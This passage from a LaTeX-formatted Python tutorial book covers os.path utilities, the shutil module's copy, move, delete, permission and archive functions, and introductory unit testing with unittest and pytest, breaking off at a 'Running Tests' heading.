\subsection{Get System Information}\label{get-system-information}

To get more detailed system information, use \texttt{os.uname()} (UNIX
only):

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    system\_info }\OperatorTok{=}\NormalTok{ os.uname()}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"System Info:"}\NormalTok{, system\_info)}
\ControlFlowTok{except} \PreprocessorTok{AttributeError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"os.uname() not available on this operating system"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Path Manipulations}\label{path-manipulations}

The \texttt{os.path} module provides utilities for manipulating file and
directory paths.

\subsection{Join Paths}\label{join-paths}

To join paths, use \texttt{os.path.join(path,\ *paths)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{full\_path }\OperatorTok{=}\NormalTok{ os.path.join(}\StringTok{\textquotesingle{}parent\_directory\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}child\_directory\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Full Path:"}\NormalTok{, full\_path)}
\end{Highlighting}
\end{Shaded}

\subsection{Split Paths}\label{split-paths}

To split a path into the directory and file, use
\texttt{os.path.split(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{directory, file\_name }\OperatorTok{=}\NormalTok{ os.path.split(}\StringTok{\textquotesingle{}/path/to/file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory:"}\NormalTok{, directory)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Name:"}\NormalTok{, file\_name)}
\end{Highlighting}
\end{Shaded}

\subsection{Get File Extension}\label{get-file-extension}

To get the file extension, use \texttt{os.path.splitext(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{file\_name, file\_extension }\OperatorTok{=}\NormalTok{ os.path.splitext(}\StringTok{\textquotesingle{}file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Name:"}\NormalTok{, file\_name)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Extension:"}\NormalTok{, file\_extension)}
\end{Highlighting}
\end{Shaded}

\subsection{Check Path Existence}\label{check-path-existence}

To check if a path exists, use \texttt{os.path.exists(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{path\_exists }\OperatorTok{=}\NormalTok{ os.path.exists(}\StringTok{\textquotesingle{}/path/to/file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Path Exists:"}\NormalTok{, path\_exists)}
\end{Highlighting}
\end{Shaded}

\subsection{Check if Path is a File or
Directory}\label{check-if-path-is-a-file-or-directory}

To check if a path is a file or directory, use
\texttt{os.path.isfile(path)} and \texttt{os.path.isdir(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{is\_file }\OperatorTok{=}\NormalTok{ os.path.isfile(}\StringTok{\textquotesingle{}/path/to/file.txt\textquotesingle{}}\NormalTok{)}
\NormalTok{is\_directory }\OperatorTok{=}\NormalTok{ os.path.isdir(}\StringTok{\textquotesingle{}/path/to/directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Is File:"}\NormalTok{, is\_file)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Is Directory:"}\NormalTok{, is\_directory)}
\end{Highlighting}
\end{Shaded}

\subsection{Get Absolute Path}\label{get-absolute-path}

To get the absolute path, use \texttt{os.path.abspath(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{absolute\_path }\OperatorTok{=}\NormalTok{ os.path.abspath(}\StringTok{\textquotesingle{}file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Absolute Path:"}\NormalTok{, absolute\_path)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-28}

The \texttt{os} module in Python provides a wide range of
functionalities for interacting with the operating system. Whether you
need to manage files and directories, work with environment variables,
manage processes, or manipulate paths, the \texttt{os} module has you
covered. Understanding and utilizing these functions can significantly
enhance your ability to create robust and versatile Python programs.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{shutil} Module in
Python}{Deep Dive into the shutil Module in Python}}\label{deep-dive-into-the-shutil-module-in-python}

The \texttt{shutil} (shell utilities) module in Python provides a
higher-level interface for file operations than the \texttt{os} module.
It is designed to handle operations like copying and moving files and
directories, managing file permissions, and creating archive files.
Let's explore the \texttt{shutil} module in detail.

\section{\texorpdfstring{Importing the \texttt{shutil}
Module}{Importing the shutil Module}}\label{importing-the-shutil-module}

To use the \texttt{shutil} module, you need to import it first:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}
\end{Highlighting}
\end{Shaded}

\section{Copying Files and
Directories}\label{copying-files-and-directories-1}

\subsection{Copy a File}\label{copy-a-file}

To copy a file from one location to another, use
\texttt{shutil.copy(src,\ dst)}. This function copies the content and
permissions of the source file to the destination file.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}

\NormalTok{shutil.copy(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File copied successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Copy a File with Metadata}\label{copy-a-file-with-metadata}

To copy a file along with its metadata (like permissions, last access
time, etc.), use \texttt{shutil.copy2(src,\ dst)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.copy2(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_file\_with\_metadata.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File copied with metadata successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Copy a Directory}\label{copy-a-directory}

To copy an entire directory tree, use
\texttt{shutil.copytree(src,\ dst)}. This function recursively copies an
entire directory tree rooted at \texttt{src} to a directory named
\texttt{dst}.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.copytree(}\StringTok{\textquotesingle{}source\_directory\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory copied successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Copy Only Directory
Structure}\label{copy-only-directory-structure}

To copy only the directory structure without files, you can use the
\texttt{ignore} parameter of \texttt{shutil.copytree}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ ignore\_files(}\BuiltInTok{dir}\NormalTok{, files):}
    \ControlFlowTok{return}\NormalTok{ [f }\ControlFlowTok{for}\NormalTok{ f }\KeywordTok{in}\NormalTok{ files }\ControlFlowTok{if}\NormalTok{ os.path.isfile(os.path.join(}\BuiltInTok{dir}\NormalTok{, f))]}

\NormalTok{shutil.copytree(}\StringTok{\textquotesingle{}source\_directory\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_directory\_structure\textquotesingle{}}\NormalTok{, ignore}\OperatorTok{=}\NormalTok{ignore\_files)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory structure copied successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Moving Files and
Directories}\label{moving-files-and-directories}

To move a file or directory from one location to another, use
\texttt{shutil.move(src,\ dst)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.move(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File moved successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

You can also move entire directories:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.move(}\StringTok{\textquotesingle{}source\_directory\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory moved successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Deleting Files and
Directories}\label{deleting-files-and-directories}

\subsection{Delete a File}\label{delete-a-file}

To delete a file, use \texttt{os.remove(path)} from the \texttt{os}
module:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\NormalTok{os.remove(}\StringTok{\textquotesingle{}file\_to\_delete.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File deleted successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Delete a Directory}\label{delete-a-directory}

To delete a directory tree, use \texttt{shutil.rmtree(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.rmtree(}\StringTok{\textquotesingle{}directory\_to\_delete\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory deleted successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{File Permissions}\label{file-permissions}

\subsection{Change File Permissions}\label{change-file-permissions}

To change the mode (permissions) of a file, use
\texttt{os.chmod(path,\ mode)} from the \texttt{os} module:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\NormalTok{os.chmod(}\StringTok{\textquotesingle{}file.txt\textquotesingle{}}\NormalTok{, }\BaseNTok{0o755}\NormalTok{)  }\CommentTok{\# Sets file permissions to rwxr{-}xr{-}x}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File permissions changed successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Copy File Permissions}\label{copy-file-permissions}

To copy the permissions of one file to another, use
\texttt{shutil.copymode(src,\ dst)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.copymode(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File permissions copied successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Copy File Metadata}\label{copy-file-metadata}

To copy the metadata of one file to another, use
\texttt{shutil.copystat(src,\ dst)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.copystat(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_file.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File metadata copied successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Archiving Operations}\label{archiving-operations}

\subsection{Create Archive Files}\label{create-archive-files}

To create an archive file (like .zip or .tar), use
\texttt{shutil.make\_archive(base\_name,\ format,\ root\_dir)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{shutil.make\_archive(}\StringTok{\textquotesingle{}archive\_name\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}zip\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}directory\_to\_archive\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Archive created successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

You can create archives in different formats like `zip', `tar', `gztar',
`bztar', or `xztar'.

\subsection{Extract Archive Files}\label{extract-archive-files}

To extract an archive file, use the \texttt{tarfile} or \texttt{zipfile}
module. For example, to extract a .zip file:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ zipfile}

\ControlFlowTok{with}\NormalTok{ zipfile.ZipFile(}\StringTok{\textquotesingle{}archive\_name.zip\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ zip\_ref:}
\NormalTok{    zip\_ref.extractall(}\StringTok{\textquotesingle{}extracted\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Archive extracted successfully"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Disk Usage}\label{disk-usage}

\subsection{Get Disk Usage Statistics}\label{get-disk-usage-statistics}

To get disk usage statistics, use \texttt{shutil.disk\_usage(path)}.
This function returns a named tuple with attributes \texttt{total},
\texttt{used}, and \texttt{free}, which are the total, used, and free
space on the disk, respectively.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{disk\_usage }\OperatorTok{=}\NormalTok{ shutil.disk\_usage(}\StringTok{\textquotesingle{}/\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Total:"}\NormalTok{, disk\_usage.total)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Used:"}\NormalTok{, disk\_usage.used)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Free:"}\NormalTok{, disk\_usage.free)}
\end{Highlighting}
\end{Shaded}

\section{Temporary Files and
Directories}\label{temporary-files-and-directories}

\subsection{Create Temporary Files and
Directories}\label{create-temporary-files-and-directories}

To create temporary files and directories, use the \texttt{tempfile}
module. For example, to create a temporary file:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ tempfile}

\ControlFlowTok{with}\NormalTok{ tempfile.NamedTemporaryFile(delete}\OperatorTok{=}\VariableTok{False}\NormalTok{) }\ImportTok{as}\NormalTok{ temp\_file:}
\NormalTok{    temp\_file.write(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Temporary file created:"}\NormalTok{, temp\_file.name)}
\end{Highlighting}
\end{Shaded}

To create a temporary directory:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ tempfile.TemporaryDirectory() }\ImportTok{as}\NormalTok{ temp\_dir:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Temporary directory created:"}\NormalTok{, temp\_dir)}
\end{Highlighting}
\end{Shaded}

\section{Example Use Cases}\label{example-use-cases}

\subsection{Example 1: Backup a
Directory}\label{example-1-backup-a-directory}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}
\ImportTok{import}\NormalTok{ os}
\ImportTok{import}\NormalTok{ time}

\CommentTok{\# Source and backup directories}
\NormalTok{source\_dir }\OperatorTok{=} \StringTok{\textquotesingle{}source\_directory\textquotesingle{}}
\NormalTok{backup\_dir }\OperatorTok{=} \StringTok{\textquotesingle{}backup\_directory\textquotesingle{}}

\CommentTok{\# Create a backup directory with a timestamp}
\NormalTok{timestamp }\OperatorTok{=}\NormalTok{ time.strftime(}\StringTok{\textquotesingle{}\%Y\%m}\SpecialCharTok{\%d}\StringTok{\%H\%M\%S\textquotesingle{}}\NormalTok{)}
\NormalTok{backup\_dir }\OperatorTok{=}\NormalTok{ os.path.join(backup\_dir, timestamp)}
\NormalTok{shutil.copytree(source\_dir, backup\_dir)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Backup created successfully at"}\NormalTok{, backup\_dir)}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: Clean Up Old
Backups}\label{example-2-clean-up-old-backups}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}
\ImportTok{import}\NormalTok{ os}
\ImportTok{import}\NormalTok{ time}

\NormalTok{backup\_dir }\OperatorTok{=} \StringTok{\textquotesingle{}backup\_directory\textquotesingle{}}
\NormalTok{days\_to\_keep }\OperatorTok{=} \DecValTok{7}
\NormalTok{now }\OperatorTok{=}\NormalTok{ time.time()}

\ControlFlowTok{for}\NormalTok{ filename }\KeywordTok{in}\NormalTok{ os.listdir(backup\_dir):}
\NormalTok{    file\_path }\OperatorTok{=}\NormalTok{ os.path.join(backup\_dir, filename)}
    \ControlFlowTok{if}\NormalTok{ os.path.isdir(file\_path):}
\NormalTok{        file\_creation\_time }\OperatorTok{=}\NormalTok{ os.path.getctime(file\_path)}
        \ControlFlowTok{if}\NormalTok{ (now }\OperatorTok{{-}}\NormalTok{ file\_creation\_time) }\OperatorTok{//}\NormalTok{ (}\DecValTok{24} \OperatorTok{*} \DecValTok{3600}\NormalTok{) }\OperatorTok{\textgreater{}=}\NormalTok{ days\_to\_keep:}
\NormalTok{            shutil.rmtree(file\_path)}
            \BuiltInTok{print}\NormalTok{(}\StringTok{"Deleted old backup:"}\NormalTok{, file\_path)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-29}

The \texttt{shutil} module in Python provides a powerful and convenient
way to handle high-level file operations. Whether you need to copy,
move, or delete files and directories, manage file permissions, or
create and extract archives, the \texttt{shutil} module has you covered.
Understanding and utilizing these functions can significantly simplify
your file management tasks in Python.

\bookmarksetup{startatroot}

\chapter{Introduction to Testing in
Python}\label{introduction-to-testing-in-python}

Testing is a crucial aspect of software development, ensuring that your
code works as expected and helping to identify and fix bugs early in the
development process. Python provides robust tools and frameworks for
writing and running tests. This tutorial will introduce you to testing
in Python using the \texttt{unittest} framework for basic unit testing
and \texttt{pytest} for more advanced testing needs.

\subsection{\texorpdfstring{Unit Testing with
\texttt{unittest}}{Unit Testing with unittest}}\label{unit-testing-with-unittest}

\texttt{unittest} is Python's built-in library for writing and running
tests. It supports test discovery, setup, teardown, and provides
assertions for verifying the correctness of your code.

\subsubsection{Basic Structure of a Test
Case}\label{basic-structure-of-a-test-case}

A test case is a single unit of testing. It checks for a specific
response to a particular set of inputs. To write a test case in
\texttt{unittest}, you define a class that inherits from
\texttt{unittest.TestCase}.

\paragraph{Example: Basic Test Case}\label{example-basic-test-case}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ unittest}

\CommentTok{\# The code to be tested}
\KeywordTok{def}\NormalTok{ add(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{+}\NormalTok{ b}

\KeywordTok{class}\NormalTok{ TestMathOperations(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ test\_add(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(add(}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{), }\DecValTok{3}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertEqual(add(}\OperatorTok{{-}}\DecValTok{1}\NormalTok{, }\DecValTok{1}\NormalTok{), }\DecValTok{0}\NormalTok{)}
        \VariableTok{self}\NormalTok{.assertEqual(add(}\DecValTok{0}\NormalTok{, }\DecValTok{0}\NormalTok{), }\DecValTok{0}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\subsection{Running Tests}\label{running-tests}

You can run the tests by executing the script. The \texttt{unittest}
framework will automatically discover and run the tests defined in the
\texttt{TestMathOperations} class.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python}\NormalTok{ test\_math\_operations.py}
\end{Highlighting}
\end{Shaded}

\subsection{Test Fixtures: Setup and
Teardown}\label{test-fixtures-setup-and-teardown}

Test fixtures allow you to set up any state needed for your tests and
clean up afterward. Use the \texttt{setUp} and \texttt{tearDown} methods
for this purpose.

\paragraph{Example: Using Test
Fixtures}\label{example-using-test-fixtures}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ unittest}

\KeywordTok{class}\NormalTok{ TestMathOperations(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ setUp(}\VariableTok{self}\NormalTok{):}
        \CommentTok{\# Set up any necessary state}
        \VariableTok{self}\NormalTok{.a }\OperatorTok{=} \DecValTok{1}
        \VariableTok{self}\NormalTok{.b }\OperatorTok{=} \DecValTok{2}

    \KeywordTok{def}\NormalTok{ tearDown(}\VariableTok{self}\NormalTok{):}
        \CommentTok{\# Clean up any necessary state}
        \ControlFlowTok{pass}

    \KeywordTok{def}\NormalTok{ test\_add(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(add(}\VariableTok{self}\NormalTok{.a, }\VariableTok{self}\NormalTok{.b), }\DecValTok{3}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\subsection{Organizing Tests into
Suites}\label{organizing-tests-into-suites}

A test suite is a collection of test cases, test suites, or both. You
can use test suites to aggregate tests that should be executed together.

\paragraph{Example: Creating a Test
Suite}\label{example-creating-a-test-suite}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ unittest}

\KeywordTok{class}\NormalTok{ TestMathOperations(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ test\_add(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(add(}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{), }\DecValTok{3}\NormalTok{)}

    \KeywordTok{def}\NormalTok{ test\_subtract(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(subtract(}\DecValTok{2}\NormalTok{, }\DecValTok{1}\NormalTok{), }\DecValTok{1}\NormalTok{)}

\KeywordTok{def}\NormalTok{ suite():}
\NormalTok{    suite }\OperatorTok{=}\NormalTok{ unittest.TestSuite()}
\NormalTok{    suite.addTest(TestMathOperations(}\StringTok{\textquotesingle{}test\_add\textquotesingle{}}\NormalTok{))}
\NormalTok{    suite.addTest(TestMathOperations(}\StringTok{\textquotesingle{}test\_subtract\textquotesingle{}}\NormalTok{))}
    \ControlFlowTok{return}\NormalTok{ suite}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    runner }\OperatorTok{=}\NormalTok{ unittest.TextTestRunner()}
\NormalTok{    runner.run(suite())}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Advanced Testing with
\texttt{pytest}}{Advanced Testing with pytest}}\label{advanced-testing-with-pytest}

\texttt{pytest} is a powerful testing framework that supports fixtures,
parameterized testing, and a more flexible structure compared to
\texttt{unittest}. It is highly recommended for more complex testing
needs.

\subsubsection{\texorpdfstring{Installing
\texttt{pytest}}{Installing pytest}}\label{installing-pytest}

You can install \texttt{pytest} using pip:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install pytest}
\end{Highlighting}
\end{Shaded}

\subsubsection{\texorpdfstring{Writing Tests with
\texttt{pytest}}{Writing Tests with pytest}}\label{writing-tests-with-pytest}

Tests in \texttt{pytest} are simple functions. You can use
\texttt{assert} statements to check for expected outcomes.

\paragraph{\texorpdfstring{Example: Basic \texttt{pytest}
Test}{Example: Basic pytest Test}}\label{example-basic-pytest-test}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# test\_math\_operations.py}

\KeywordTok{def}\NormalTok{ add(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{+}\NormalTok{ b}

\KeywordTok{def}\NormalTok{ test\_add():}
    \ControlFlowTok{assert}\NormalTok{ add(}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{) }\OperatorTok{==} \DecValTok{3}
    \ControlFlowTok{assert}\NormalTok{ add(}\OperatorTok{{-}}\DecValTok{1}\NormalTok{, }\DecValTok{1}\NormalTok{) }\OperatorTok{==} \DecValTok{0}
    \ControlFlowTok{assert}\NormalTok{ add(}\DecValTok{0}\NormalTok{, }\DecValTok{0}\NormalTok{) }\OperatorTok{==} \DecValTok{0}
\end{Highlighting}
\end{Shaded}

\subsubsection{\texorpdfstring{Running \texttt{pytest}
Tests}{Running pytest Tests}}\label{running-pytest-tests}

Run the tests using the \texttt{pytest} command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pytest}\NormalTok{ test\_math\_operations.py}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Using Fixtures in
\texttt{pytest}}{Using Fixtures in pytest}}\label{using-fixtures-in-pytest}

Fixtures in \texttt{pytest} provide a way to set up and clean up
resources needed for tests.

\paragraph{Example: Using Fixtures}\label{example-using-fixtures}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pytest}

\AttributeTok{@pytest.fixture}
\KeywordTok{def}\NormalTok{ numbers():}
    \ControlFlowTok{return} \DecValTok{1}\NormalTok{, }\DecValTok{2}

\KeywordTok{def}\NormalTok{ test\_add(numbers):}
\NormalTok{    a, b }\OperatorTok{=}\NormalTok{ numbers}
    \ControlFlowTok{assert}\NormalTok{ add(a, b) }\OperatorTok{==} \DecValTok{3}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Parameterized Tests in
\texttt{pytest}}{Parameterized Tests in pytest}}\label{parameterized-tests-in-pytest}

Parameterized tests allow you to run a test function with different sets
of parameters.

\paragraph{Example: Parameterized
Tests}\label{example-parameterized-tests}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pytest}

\AttributeTok{@pytest.mark.parametrize}\NormalTok{(}\StringTok{"a,b,expected"}\NormalTok{, [}
\NormalTok{    (}\DecValTok{1}\NormalTok{, }\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{),}
\NormalTok{    (}\OperatorTok{{-}}\DecValTok{1}\NormalTok{, }\DecValTok{1}\NormalTok{, }\DecValTok{0}\NormalTok{),}
\NormalTok{    (}\DecValTok{0}\NormalTok{, }\DecValTok{0}\NormalTok{, }\DecValTok{0}\NormalTok{),}
\NormalTok{])}
\KeywordTok{def}\NormalTok{ test\_add(a, b, expected):}
    \ControlFlowTok{assert}\NormalTok{ add(a, b) }\OperatorTok{==}\NormalTok{ expected}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-30}

Testing is an essential part of software development that ensures your
code works correctly and efficiently. By using \texttt{unittest} for
basic unit testing and \texttt{pytest} for more advanced testing
scenarios, you can create comprehensive test suites that cover various
aspects of your application. Proper testing leads to more robust and
reliable code, ultimately improving the quality of your software.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{unittest} Module in
Python}{Deep Dive into the unittest Module in Python}}\label{deep-dive-into-the-unittest-module-in-python}

The \texttt{unittest} module in Python is a built-in library that
provides a framework for creating and running tests. It supports test
automation, sharing of setup and shutdown code for tests, aggregation of
tests into collections, and independence of the tests from the reporting
framework. In this tutorial, we will explore the \texttt{unittest}
module in depth.

\section{\texorpdfstring{Importing the \texttt{unittest}
Module}{Importing the unittest Module}}\label{importing-the-unittest-module}

To use the \texttt{unittest} module, you need to import it first:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ unittest}
\end{Highlighting}
\end{Shaded}

\section{Basic Structure of a Test
Case}\label{basic-structure-of-a-test-case-1}

A test case is created by subclassing \texttt{unittest.TestCase}. Each
test is defined as a method within the class. Methods starting with the
word ``test'' are recognized as test methods.

\subsection{Example}\label{example-10}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ unittest}

\KeywordTok{class}\NormalTok{ TestStringMethods(unittest.TestCase):}

    \KeywordTok{def}\NormalTok{ test\_upper(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(}\StringTok{\textquotesingle{}foo\textquotesingle{}}\NormalTok{.upper(), }\StringTok{\textquotesingle{}FOO\textquotesingle{}}\NormalTok{)}

    \KeywordTok{def}\NormalTok{ test\_isupper(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertTrue(}\StringTok{\textquotesingle{}FOO\textquotesingle{}}\NormalTok{.isupper())}
        \VariableTok{self}\NormalTok{.assertFalse(}\StringTok{\textquotesingle{}Foo\textquotesingle{}}\NormalTok{.isupper())}

    \KeywordTok{def}\NormalTok{ test\_split(}\VariableTok{self}\NormalTok{):}
\NormalTok{        s }\OperatorTok{=} \StringTok{\textquotesingle{}hello world\textquotesingle{}}
        \VariableTok{self}\NormalTok{.assertEqual(s.split(), [}\StringTok{\textquotesingle{}hello\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}world\textquotesingle{}}\NormalTok{])}
        \ControlFlowTok{with} \VariableTok{self}\NormalTok{.assertRaises(}\PreprocessorTok{TypeError}\NormalTok{):}
\NormalTok{            s.split(}\DecValTok{2}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\subsection{Explanation}\label{explanation}

\begin{itemize}
\tightlist
\item
  \textbf{Test Case}: A test case is created by subclassing
  \texttt{unittest.TestCase}.
\item
  \textbf{Test Methods}: Methods starting with \texttt{test\_} are test
  cases. In the example, \texttt{test\_upper}, \texttt{test\_isupper},
  and \texttt{test\_split} are test methods.
\item
  \textbf{Assertions}: Assertions are used to check if a condition is
  true. If an assertion fails, the test fails.
\end{itemize}

\section{Running Tests}\label{running-tests-1}

